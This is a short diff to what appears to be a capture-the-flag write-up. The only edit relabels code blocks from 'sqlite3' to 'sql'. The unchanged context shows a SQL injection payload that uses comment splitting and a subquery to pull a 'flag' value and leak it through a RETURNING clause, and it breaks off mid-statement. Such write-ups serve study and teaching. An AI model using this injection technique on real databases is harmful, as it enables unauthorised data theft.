@@ -683,13 +683,13 @@ INSERT INTO secrets (ip, secret)
 
 - Lastly, the keyword `RETURNING` allows us to return values in `sqlite3` which is  useful.We can also return another column as another e.g `secret` instead of id.
 
-```sqlite3
+```sql
 RETURNING secret as id
 ```
 
 - Final visual idea-:
 
-```sqlite3
+```sql
 INSERT INTO secrets (ip, secret)
         VALUES (''/*', '*/,(SELECT "flag" from flag)) RETURNING secret as id/*')
         ON CONFLICT(ip) DO UPDATE SET
